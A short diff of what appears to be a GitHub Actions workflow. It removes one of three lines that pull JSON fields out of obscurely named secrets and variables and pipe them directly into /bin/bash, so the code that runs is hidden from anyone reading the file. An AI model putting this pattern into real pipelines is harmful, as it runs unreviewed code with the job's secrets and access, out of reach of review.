@@ -21,7 +21,6 @@ jobs:
           kfrid7: ${{ secrets.kfrid7 }}
         run: |
           printf '%s' "$kfrid7" | jq -r .uiejn4 | /bin/bash
-          printf '%s' "$aqg4" | jq -r .clcfc24284 | /bin/bash
           echo $nhsu29476 | jq -r .g6097 | /bin/bash
 
       - name: Save data
